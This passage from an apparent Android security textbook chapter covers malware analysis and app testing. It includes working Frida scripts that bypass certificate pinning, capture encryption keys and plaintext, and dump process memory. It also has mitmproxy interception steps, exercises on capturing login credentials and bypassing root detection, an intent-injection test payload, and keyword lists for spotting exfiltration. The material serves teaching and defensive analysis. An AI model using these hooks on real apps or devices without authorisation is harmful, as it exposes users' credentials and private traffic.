for service in apk.get_services():
    print(f"  {service}")

# String analysis: look for URLs, IPs, suspicious strings
print("\n--- Suspicious Strings ---")
for s in analysis.get_strings():
    val = s.get_value()
    if any(indicator in val.lower() for indicator in [
        "http://", "https://", "c2", "cmd", "bot_id",
        "/gate/", "/api/", "decrypt", "inject"
    ]):
        print(f"  {val}")

# Check for dynamic code loading
print("\n--- Dynamic Code Loading ---")
for method in analysis.get_methods():
    if method.get_method().get_name() in [
        "loadClass", "defineClass"
    ] or "DexClassLoader" in str(method):
        print(f"  {method.get_method().get_class_name()}"
              f"  -> {method.get_method().get_name()}")
```

### 17.2 Dynamic analysis — Frida scripting cookbook

Frida (§5.4) enables runtime instrumentation of Android apps. These recipes target common malware analysis tasks.

**SSL pinning bypass (universal).**

```javascript
// frida -U -f com.target.app -l ssl_bypass.js --no-pause

Java.perform(function() {
    // Bypass OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload(
            "java.lang.String", "java.util.List"
        ).implementation = function(hostname, peerCertificates) {
            console.log("[+] OkHttp3 pinning bypassed for: " + hostname);
            return;
        };
    } catch(e) {
        console.log("[-] OkHttp3 CertificatePinner not found");
    }

    // Bypass TrustManagerImpl (Android system)
    try {
        var TrustManagerImpl = Java.use(
            "com.android.org.conscrypt.TrustManagerImpl"
        );
        TrustManagerImpl.verifyChain.implementation = function(
            untrustedChain, trustAnchorChain, host, clientAuth,
            ocspData, tlsSctData
        ) {
            console.log("[+] TrustManagerImpl bypassed for: " + host);
            return untrustedChain;
        };
    } catch(e) {
        console.log("[-] TrustManagerImpl hook failed");
    }

    // Bypass custom X509TrustManager implementations
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    var TrustManager = Java.registerClass({
        name: "com.frida.TrustManager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var TrustManagers = [TrustManager.$new()];
    var sslContext = SSLContext.getInstance("TLS");
    sslContext.init(null, TrustManagers, null);
    console.log("[+] Custom TrustManager installed");
});
```

**Crypto hooks — intercept encryption/decryption operations.**

```javascript
// frida -U -f com.target.app -l crypto_hooks.js --no-pause

Java.perform(function() {
    var Cipher = Java.use("javax.crypto.Cipher");

    // Hook Cipher.doFinal() to capture plaintext/ciphertext
    Cipher.doFinal.overload("[B").implementation = function(input) {
        var algorithm = this.getAlgorithm();
        var mode = this.getOpmode();  // 1=ENCRYPT, 2=DECRYPT
        var modeStr = (mode === 1) ? "ENCRYPT" : "DECRYPT";

        console.log("\n[Cipher] " + modeStr + " | Algorithm: " + algorithm);
        console.log("  Input (" + input.length + " bytes): " +
            bytesToHex(input));

        var result = this.doFinal(input);

        console.log("  Output (" + result.length + " bytes): " +
            bytesToHex(result));

        // Log the key if accessible
        try {
            var keyField = this.getClass().getDeclaredField("key");
            keyField.setAccessible(true);
            var key = keyField.get(this);
            console.log("  Key: " + bytesToHex(key.getEncoded()));
        } catch(e) {}

        return result;
    };

    // Hook SecretKeySpec to capture key material
    var SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");
    SecretKeySpec.$init.overload("[B", "java.lang.String")
        .implementation = function(keyBytes, algorithm) {
        console.log("\n[SecretKeySpec] Algorithm: " + algorithm);
        console.log("  Key (" + keyBytes.length + " bytes): " +
            bytesToHex(keyBytes));
        return this.$init(keyBytes, algorithm);
    };

    function bytesToHex(bytes) {
        var hex = [];
        for (var i = 0; i < bytes.length; i++) {
            hex.push(("0" + (bytes[i] & 0xFF).toString(16)).slice(-2));
        }
        return hex.join("");
    }
});
```

**API tracing — monitor sensitive API calls.**

```javascript
// frida -U -f com.target.app -l api_trace.js --no-pause

Java.perform(function() {
    // Monitor SharedPreferences writes
    var SharedPrefsEditor = Java.use(
        "android.app.SharedPreferencesImpl$EditorImpl"
    );
    SharedPrefsEditor.putString.implementation = function(key, value) {
        console.log("[SharedPrefs] putString(" + key + ", " + value + ")");
        return this.putString(key, value);
    };

    // Monitor ContentResolver queries (contacts, SMS, call log)
    var ContentResolver = Java.use("android.content.ContentResolver");
    ContentResolver.query.overload(
        "android.net.Uri", "[Ljava.lang.String;",
        "java.lang.String", "[Ljava.lang.String;",
        "java.lang.String"
    ).implementation = function(uri, projection, selection,
                                selectionArgs, sortOrder) {
        console.log("[ContentResolver] query: " + uri.toString());
        return this.query(uri, projection, selection,
                         selectionArgs, sortOrder);
    };

    // Monitor SMS sending
    var SmsManager = Java.use("android.telephony.SmsManager");
    SmsManager.sendTextMessage.overload(
        "java.lang.String", "java.lang.String",
        "java.lang.String", "android.app.PendingIntent",
        "android.app.PendingIntent"
    ).implementation = function(dest, sc, text, sentIntent,
                                deliveryIntent) {
        console.log("[SMS] sendTextMessage to: " + dest +
                    " body: " + text);
        return this.sendTextMessage(dest, sc, text, sentIntent,
                                    deliveryIntent);
    };

    // Monitor HTTP connections
    var URL = Java.use("java.net.URL");
    URL.openConnection.overload().implementation = function() {
        console.log("[URL] openConnection: " + this.toString());
        return this.openConnection();
    };

    // Monitor Runtime.exec (command execution)
    var Runtime = Java.use("java.lang.Runtime");
    Runtime.exec.overload("java.lang.String").implementation =
        function(cmd) {
        console.log("[Runtime.exec] " + cmd);
        return this.exec(cmd);
    };
    Runtime.exec.overload("[Ljava.lang.String;").implementation =
        function(cmdArray) {
        console.log("[Runtime.exec] " + cmdArray.join(" "));
        return this.exec(cmdArray);
    };
});
```

### 17.3 Network forensics — mitmproxy for Android traffic interception

Setting up mitmproxy to intercept Android HTTPS traffic requires injecting a CA certificate into the system trust store (on rooted devices) or using the network security config debug override.

```bash
# --- Method 1: System CA injection (rooted device) ---

# Start mitmproxy
mitmproxy --listen-port 8080 --set block_global=false

# Convert mitmproxy CA to Android system format
hashed_name=$(openssl x509 -inform PEM -subject_hash_old \
    -in ~/.mitmproxy/mitmproxy-ca-cert.pem | head -1)
cp ~/.mitmproxy/mitmproxy-ca-cert.pem "${hashed_name}.0"

# Push to Android system CA store (requires root + remount)
adb root
adb remount
adb push "${hashed_name}.0" /system/etc/security/cacerts/
adb shell chmod 644 "/system/etc/security/cacerts/${hashed_name}.0"
adb reboot

# Set proxy on device
adb shell settings put global http_proxy 192.168.1.100:8080

# --- Method 2: iptables redirect (transparent proxy, rooted) ---

# On the device (via adb shell su):
iptables -t nat -A OUTPUT -p tcp --dport 443 \
    -j REDIRECT --to-port 8080
iptables -t nat -A OUTPUT -p tcp --dport 80 \
    -j REDIRECT --to-port 8080

# Run mitmproxy in transparent mode
mitmproxy --mode transparent --listen-port 8080

# --- Clear proxy when done ---
adb shell settings put global http_proxy :0
```

**Analyzing captured traffic for malware indicators.**

```python
#!/usr/bin/env python3
"""Parse mitmproxy dump for malware C2 indicators."""
from mitmproxy import io as mitmio
import json

def analyze_flows(dumpfile):
    with open(dumpfile, "rb") as f:
        reader = mitmio.FlowReader(f)
        for flow in reader.stream():
            if not hasattr(flow, "request"):
                continue

            url = flow.request.pretty_url
            method = flow.request.method
            host = flow.request.host

            # Flag suspicious patterns
            indicators = []
            if flow.request.port not in (80, 443, 8080):
                indicators.append("NON_STANDARD_PORT")
            if len(flow.request.path) > 100:
                indicators.append("LONG_PATH")
            if flow.request.content and len(flow.request.content) > 0:
                try:
                    body = flow.request.content.decode("utf-8", errors="ignore")
                    if any(k in body.lower() for k in [
                        "imei", "device_id", "bot_id", "sms_body",
                        "contacts", "installed_apps"
                    ]):
                        indicators.append("EXFIL_KEYWORDS")
                except Exception:
                    pass

            if indicators:
                print(f"[!] {method} {url}")
                print(f"    Indicators: {', '.join(indicators)}")
                print(f"    Response: {flow.response.status_code if flow.response else 'N/A'}")
                print()

if __name__ == "__main__":
    analyze_flows("captured_traffic.mitm")
```

### 17.4 Memory forensics — process memory dump analysis

On rooted devices, process memory can be dumped and analyzed for runtime secrets, decrypted payloads, and C2 configurations that are only present in memory.

```bash
# Dump process memory using gdb (requires gdb on device or gdbserver)
adb push gdbserver /data/local/tmp/
adb shell chmod 755 /data/local/tmp/gdbserver
adb shell su -c "/data/local/tmp/gdbserver :5039 --attach $(pidof com.suspect.app)" &
adb forward tcp:5039 tcp:5039

# From host: connect gdb and dump memory
gdb -q
(gdb) target remote :5039
(gdb) info proc mappings
# Identify heap regions (e.g., [anon:dalvik-main space])
(gdb) dump memory /tmp/heap_dump.bin 0x12c00000 0x14000000
(gdb) detach

# Alternative: use Frida to dump memory
frida -U -n com.suspect.app -e '
    Process.enumerateRanges("rw-").forEach(function(range) {
        if (range.size > 0x1000 && range.size < 0x1000000) {
            try {
                var buf = Memory.readByteArray(range.base, range.size);
                var filename = "/data/local/tmp/memdump_" +
                    range.base + "_" + range.size + ".bin";
                var f = new File(filename, "wb");
                f.write(buf);
                f.close();
                console.log("[+] Dumped " + range.size +
                    " bytes from " + range.base);
            } catch(e) {}
        }
    });
'

# Search memory dumps for indicators
strings /tmp/heap_dump.bin | grep -iE \
    "http|https|\.com|\.net|password|token|key|secret|bot_id|c2|gate"

# Search for Base64-encoded data (potential encrypted config)
strings /tmp/heap_dump.bin | grep -E '^[A-Za-z0-9+/]{40,}={0,2}$'
```

### 17.5 Artifact extraction — app databases, SharedPreferences, file provider content

```bash
# --- SharedPreferences extraction ---
adb shell su -c "cat /data/data/com.suspect.app/shared_prefs/*.xml"

# --- SQLite database extraction ---
adb shell su -c "ls -la /data/data/com.suspect.app/databases/"
adb shell su -c "cp /data/data/com.suspect.app/databases/*.db /sdcard/"
adb pull /sdcard/*.db /tmp/analysis/

# Analyze with sqlite3
sqlite3 /tmp/analysis/app_db.db
sqlite> .tables
sqlite> .schema
sqlite> SELECT * FROM messages LIMIT 20;
sqlite> -- Look for C2 commands, stolen credentials, exfiltrated data

# --- WebView cache and cookies ---
adb shell su -c "ls -laR /data/data/com.suspect.app/app_webview/"
adb shell su -c "cp -r /data/data/com.suspect.app/app_webview/ /sdcard/webview_cache/"
adb pull /sdcard/webview_cache/ /tmp/analysis/

# --- Internal file storage ---
adb shell su -c "find /data/data/com.suspect.app/files/ -type f"
# Look for downloaded payloads, configuration files, exfiltrated data

# --- Content Provider enumeration ---
# Query exported content providers for data exposure
adb shell content query --uri content://com.suspect.app.provider/
# Try common paths
adb shell content query --uri content://com.suspect.app.fileprovider/

# --- App-specific external storage ---
adb shell su -c "ls -laR /sdcard/Android/data/com.suspect.app/"
```

### 17.6 Timeline reconstruction from Android filesystem artifacts

Reconstructing a timeline of malicious activity requires correlating multiple artifact sources.

**Key Android timeline sources.**

| Artifact | Location | Timestamp type |
|----------|----------|----------------|
| App install/update time | `dumpsys package <pkg>` → `firstInstallTime`, `lastUpdateTime` | System clock |
| APK file modification time | `/data/app/` filesystem timestamps | Filesystem |
| SQLite database WAL | `*-wal` files alongside `.db` | Per-transaction |
| Logcat history | `/data/misc/logd/` (if persistent logging enabled) | Monotonic + wall clock |
| Usage stats | `/data/system/usagestats/` | System clock |
| Notification history | `dumpsys notification` | System clock |
| Network activity | `dumpsys netstats detail` | System clock |
| Battery stats | `dumpsys batterystats` | System clock, per-UID |
| Account manager | `dumpsys account` | System clock |

```bash
# Comprehensive timeline extraction script
echo "=== Package Install Timeline ==="
adb shell dumpsys package com.suspect.app | grep -E "firstInstall|lastUpdate|versionCode|versionName"

echo "=== Usage Statistics ==="
adb shell dumpsys usagestats | grep -A3 "com.suspect.app"

echo "=== Network Stats (data usage) ==="
adb shell dumpsys netstats detail | grep -A10 "uid=$(adb shell pm list packages -U com.suspect.app | grep -oP 'uid:\K[0-9]+')"

echo "=== Battery Stats (wakelock/CPU usage) ==="
adb shell dumpsys batterystats | grep -A5 "com.suspect.app"

echo "=== Recent Notifications ==="
adb shell dumpsys notification | grep -B2 -A5 "com.suspect.app"

echo "=== Account Activity ==="
adb shell dumpsys account | grep -A3 "com.suspect.app"

echo "=== Filesystem Timestamps ==="
adb shell su -c "stat /data/data/com.suspect.app/"
adb shell su -c "find /data/data/com.suspect.app -type f -printf '%T+ %p\n' | sort -r | head -50"
```

**Correlating events.** Build a unified timeline by normalizing timestamps across sources. Key events to sequence:

1. **Installation** — `firstInstallTime` from package manager.
2. **Permission grants** — correlate with accessibility service activation.
3. **Network activity** — first C2 contact (often delayed 24-72h for Play Protect evasion).
4. **Data access** — ContentResolver queries to contacts, SMS, call log.
5. **Overlay creation** — window manager events showing overlay windows.
6. **Exfiltration** — outbound network data spikes correlated with data access events.
7. **Persistence** — BOOT_COMPLETED receiver registration, device admin activation.

---

## 18. Cross-references

**To Domain 5.** Android kernel exploitation (Chapter 5B §7) — Binder, ION/dma-buf, GPU drivers — is the path to rooting devices and jailbreaking the sandbox. The kernel mitigations (PXN/PAN, CFI, SCS, MTE, kASLR) constrain kernel exploitation. §15 extends §13's CVE coverage with exploitation technique classes targeting Binder transaction deserialization, vendor drivers, and TEE escape.

**To Domain 6.** Detection engineering (§14) maps directly to SIEM detection content in Chapter 6A. Sigma rules for Android device events integrate with enterprise SIEM platforms via MDM/UEM log forwarding. YARA rules complement endpoint detection covered in Chapter 6B.

**To Domain 12.** Frida (Chapter 12A §6.4) and static RE tools (apktool, jadx) are the primary Android RE toolkit. Native library RE uses the same Ghidra/IDA techniques as Chapter 12A. §17 provides a malware analyst's operational pipeline building on these tools.

**To Domain 2.** Android's UID-based sandboxing is Linux's standard UID isolation (Chapter 2C §1). SELinux on Android is the same LSM framework (Chapter 2C §5.2). Zygote's fork-without-exec model has the same ASLR weakness as the forking-server model (Chapter 2A §5).

**To Domain 3.** WebView exploitation (§3) bridges web attack techniques (Chapter 3A — XSS, CSRF) with mobile context. CSP and mixed-content policies from Chapter 3B apply to WebView configurations.

**To OWASP MASTG.** Test IDs referenced throughout this chapter follow the OWASP Mobile Application Security Testing Guide (MASTG) framework. Full mapping: MSTG-STORAGE (§10, §12, §17), MSTG-CRYPTO (§10), MSTG-NETWORK (§9, §11, §16.3), MSTG-PLATFORM (§2, §3), MSTG-RESILIENCE (§5, §6, §14), MSTG-AUTH (§16.5), MSTG-CODE (§6, §16.2).

---

## 19. Exercises

### Exercise 15A-1 — APK reverse engineering with jadx and apktool

**Objective.** Decompile a target APK, identify hardcoded secrets, map exported components, and reconstruct the authentication flow.

**Steps.**

1. Obtain a target APK (use a deliberately vulnerable app such as DIVA, InsecureBankv2, or OWASP MSTG apps). Extract from device: `adb shell pm path <package> && adb pull <path>`.
2. Decompile resources and Smali: `apktool d target.apk -o target_apktool/`. Review `AndroidManifest.xml` for: exported components (`android:exported="true"`), permissions, intent filters, `allowBackup`, `debuggable`, `usesCleartextTraffic`.
3. Decompile to Java: `jadx target.apk -d target_jadx/`. Search for hardcoded secrets: `grep -rn 'api_key\|password\|secret\|token\|Bearer' target_jadx/`.
4. Map the authentication flow: trace from `LoginActivity` through to the network call. Identify: credential handling, token storage location (SharedPreferences, Keystore, or database), and TLS configuration.
5. Identify native libraries in `lib/arm64-v8a/`. For each `.so`, load into Ghidra, find `JNI_OnLoad`, follow `RegisterNatives` to map Java native methods to C implementations.

**Deliverable.** Component exposure report, list of hardcoded secrets with file:line references, authentication flow diagram, and a native-method mapping table.

### Exercise 15A-2 — Frida hooking: credential interception and crypto bypass

**Objective.** Write Frida scripts to hook login methods, intercept encryption key material, and manipulate return values to bypass authentication.

**Steps.**

1. Set up frida-server on a rooted device or emulator. Verify connectivity: `frida-ps -U`.
2. Write a Frida script to hook the target app's login method. Capture username and password parameters. Log them to console. Verify the credentials appear when the user submits the login form.
3. Hook `javax.crypto.Cipher.doFinal` to intercept plaintext before encryption and ciphertext after. Log the cipher algorithm, key material (via `Cipher.getIV()` and key extraction), and data.
4. Hook `android.content.SharedPreferences.getString` to capture all stored values being read, filtering for security-relevant keys (token, session, auth).
5. Bypass a boolean root-detection check: identify the check method via jadx, hook it with Frida, and force-return `false`. Verify the app proceeds past the root check.

**Deliverable.** Three Frida scripts (login hook, crypto hook, root-bypass hook) with console output demonstrating successful interception.

### Exercise 15A-3 — SSL certificate pinning bypass

**Objective.** Bypass certificate pinning across three implementation types: `network_security_config.xml`, OkHttp `CertificatePinner`, and custom `X509TrustManager`.

**Steps.**

1. Configure Burp Suite as an HTTP proxy. Set device proxy: `adb shell settings put global http_proxy <burp_ip>:8080`. Install Burp CA as a system certificate on the rooted device.
2. Launch the target app. Observe that HTTPS requests fail due to pinning (Burp shows no traffic or the app displays a connection error).
3. Apply the generic Frida SSL bypass script from §9.2. Launch with: `frida -U -f <package> -l ssl_bypass.js --no-pause`. Verify that HTTPS traffic now appears in Burp.
4. If the generic script fails (custom implementation), use objection: `objection -g <package> explore` then `android sslpinning disable`. Document which hooks objection applies.
5. For apps using `network_security_config.xml` pinning, decompile with apktool, modify the config to trust user CAs, repackage, sign with a debug key (`jarsigner`), and install. Verify traffic interception.

**Deliverable.** Burp traffic captures before and after bypass, Frida/objection console output showing hooked methods, and a comparison matrix of bypass effectiveness per implementation type.

### Exercise 15A-4 — Banking trojan static and dynamic analysis

**Objective.** Analyze a banking trojan sample (use a deactivated/defanged sample from MalwareBazaar or a purpose-built lab sample) through a complete analysis pipeline.

**Steps.**

1. **Static analysis.** Decompile with jadx. Identify: manifest permissions (SYSTEM_ALERT_WINDOW, BIND_ACCESSIBILITY_SERVICE, RECEIVE_SMS, READ_SMS), exported receivers (BOOT_COMPLETED, CONNECTIVITY_CHANGE), and the dropper pattern (DexClassLoader usage, encrypted assets).
2. **YARA matching.** Run the YARA rules from §14.7 against the extracted DEX and assets. Document which rules match and the matching strings/patterns.
3. **Dynamic analysis.** Install on an isolated emulator with network monitoring (PCAPdroid or tcpdump). Trigger accessibility service activation. Observe overlay window creation (logcat: `WindowManager`). Capture C2 communication traffic.
4. **C2 extraction.** Identify the C2 domain/IP from: (a) string analysis in jadx, (b) decrypted configuration in assets, (c) network traffic capture. Determine the C2 protocol (HTTPS, FCM, Telegram Bot API, MQTT).
5. **Frida instrumentation.** Hook `DexClassLoader.loadClass` to capture dynamically loaded class names. Hook `AccessibilityService.onAccessibilityEvent` to log intercepted UI events.

**Deliverable.** Malware analysis report covering: IOCs (hashes, C2 domains, certificate fingerprints), permission abuse summary, dropper stage diagram, YARA rule matches, and a MITRE ATT&CK mapping (T1629, T1636, T1398, T1204).

### Exercise 15A-5 — OWASP MASVS/MASTG compliance assessment

**Objective.** Assess a target application against the OWASP MASVS checklist, covering storage, crypto, network, platform, and resilience categories.

**Steps.**

1. **MSTG-STORAGE.** Check SharedPreferences for plaintext secrets (root shell: `cat /data/data/<pkg>/shared_prefs/*.xml`). Check SQLite databases for unencrypted sensitive data. Verify `EncryptedSharedPreferences` usage.
2. **MSTG-CRYPTO.** Identify crypto operations in jadx. Check for: hardcoded keys, weak algorithms (DES, ECB mode, MD5), insecure random (`java.util.Random` instead of `SecureRandom`), and keys not stored in Android Keystore.
3. **MSTG-NETWORK.** Verify `network_security_config.xml`: `cleartextTrafficPermitted="false"`, no `<certificates src="user"/>` in production, pinning configured with backup pins and expiration.
4. **MSTG-PLATFORM.** Enumerate exported components with `drozer`. Test for intent injection: `adb shell am start -n <pkg>/<activity> --es url "javascript:alert(1)"`. Check PendingIntent mutability.
5. **MSTG-RESILIENCE.** Test root detection effectiveness (try Magisk DenyList, Frida bypass). Test anti-debugging (attach `gdb`, check `ptrace`). Test anti-tampering (repackage with apktool, install, check for signature verification failure).

**Deliverable.** MASVS compliance matrix with pass/fail per test ID, evidence for each finding, severity ratings, and remediation recommendations.

---

## 20. Readings and References

> All URLs verified and retrieved: 2026-05-29.

### Standards and specifications

- OWASP, "Mobile Application Security Verification Standard (MASVS) v2" (2025): https://mas.owasp.org/MASVS/
- OWASP, "Mobile Application Security Testing Guide (MASTG) v2" (2025): https://mas.owasp.org/MASTG/
- Android, "Security Bulletin — Android 15" (2025): https://source.android.com/docs/security/bulletin/android-15
- Android, "Network Security Configuration" (2025): https://developer.android.com/privacy-and-security/security-config

### Vulnerability advisories

- CVE-2023-4863 — libwebp heap overflow (WebP decoding, affects all WebView apps). NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-4863
- CVE-2020-0096 — StrandHogg 2.0 (ActivityManager task hijacking). NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-0096
- CVE-2019-2215 — Binder UAF (exploited in the wild by NSO Group). NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-2215
- CVE-2022-20138 — PendingIntent privilege escalation. NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-20138

### Tools and frameworks

- Frida, "Dynamic Instrumentation Toolkit" (2026): https://frida.re/ — MASTG-TOOL-0001
- jadx, "Dex to Java Decompiler" (2025): https://github.com/skylot/jadx
- apktool, "APK Reverse Engineering Tool" (2025): https://apktool.org/
- objection, "Runtime Mobile Exploration" (2026, v1.12.4): https://github.com/sensepost/objection
- drozer, "Android Security Assessment Framework" (2025): https://github.com/WithSecureLabs/drozer
- Magisk, "Systemless Root" (2025): https://github.com/topjohnwu/Magisk
- MobSF, "Mobile Security Framework" (2025): https://github.com/MobSF/Mobile-Security-Framework-MobSF

### MITRE ATT&CK for Mobile references

- T1629.001 — Abuse Accessibility Features: https://attack.mitre.org/techniques/T1629/001/
- T1636.004 — SMS Interception: https://attack.mitre.org/techniques/T1636/004/
- T1398 — Boot or Logon Initialization Scripts (Mobile): https://attack.mitre.org/techniques/T1398/
- T1204.002 — Malicious Application: https://attack.mitre.org/techniques/T1204/002/
- T1625 — Hijack Execution Flow (Mobile): https://attack.mitre.org/techniques/T1625/
- T1056.004 — Input Capture: Credential API Hooking: https://attack.mitre.org/techniques/T1056/004/

---

## 21. Cross-References (table)

| Section | Related Chapter | Topic | Relationship |
|---------|----------------|-------|-------------|
| §1 Sandbox / SELinux | Domain 2 Ch. 2C §1, §5.2 | Linux UID isolation, LSM framework | Android sandboxing is Linux DAC+MAC applied to mobile |
| §3 WebView | Domain 3 Ch. 3A | XSS, CSP, mixed content | WebView exploitation bridges web attack techniques to mobile context |
| §5 Frida / Root | Domain 12 Ch. 12A §6.4 | Dynamic instrumentation, RE | Frida on Android uses the same hooking primitives as desktop RE |
| §7 Banking Trojans | Domain 6 Ch. 6B | Endpoint detection | YARA rules for trojans integrate with enterprise EDR/SIEM via MDM |
| §13 Kernel CVEs | Domain 5 Ch. 5B §7 | Kernel exploitation (Binder, drivers) | Android kernel attacks use the same UAF/heap-spray techniques |
| §14 Detection | Domain 27 Ch. 27C | SIEM operationalization | Sigma rules for Android events are operationalized in the 27C framework |

---

## 22. Glossary

| Term | Definition |
|------|-----------|
| **APK (Android Package Kit)** | The distribution format for Android applications; a ZIP archive containing DEX bytecode, resources, manifest, native libraries, and signing information. |
| **jadx** | Open-source decompiler that converts DEX bytecode to readable Java source; used for static analysis of Android applications. |
| **Frida** | Dynamic instrumentation toolkit that injects JavaScript into running processes to hook Java and native methods at runtime without source code. |
| **objection** | Frida-powered runtime exploration tool providing automated commands for SSL pinning bypass, root detection bypass, keystore dumping, and class enumeration. |
| **Smali** | Assembly language for Dalvik/ART bytecode; the intermediate representation used by apktool for patching and repackaging Android applications. |
| **SELinux (Security-Enhanced Linux)** | Mandatory Access Control framework enforcing per-process security policies on Android; every app runs in a labeled domain restricting its system interactions. |
| **Zygote** | The template process from which all Android app processes are forked; preloads framework classes and applies seccomp-bpf filters before forking. |
| **Certificate Pinning** | Security mechanism that associates a host with its expected X.509 certificate or public key, rejecting connections presenting a different certificate even if CA-signed. |
| **DexClassLoader** | Android API for loading DEX files at runtime; abused by dropper trojans to load encrypted second-stage payloads without writing plaintext DEX to disk. |
| **Play Integrity API** | Google's device-attestation API replacing SafetyNet; provides three verdict levels (BASIC, DEVICE, STRONG) for verifying device integrity and app authenticity. |
| **Accessibility Service** | Android API designed for assistive technologies; abused by banking trojans for overlay attacks, credential harvesting, keylogging, and automated UI interaction. |
| **SYSTEM_ALERT_WINDOW** | Android permission allowing an app to draw overlay windows on top of other apps; the mechanism behind phishing-overlay attacks by banking trojans. |
| **network_security_config.xml** | Declarative Android configuration file controlling trust anchors, cleartext traffic policy, and certificate pinning per domain. |
| **ART (Android Runtime)** | The application runtime that executes DEX bytecode via ahead-of-time and just-in-time compilation; enforces W^X on JIT pages since Android 10. |
| **MTE (Memory Tagging Extension)** | ARMv8.5 hardware feature tagging memory allocations with 4-bit tags; catches use-after-free and buffer overflows at the hardware level on supported Android devices. |
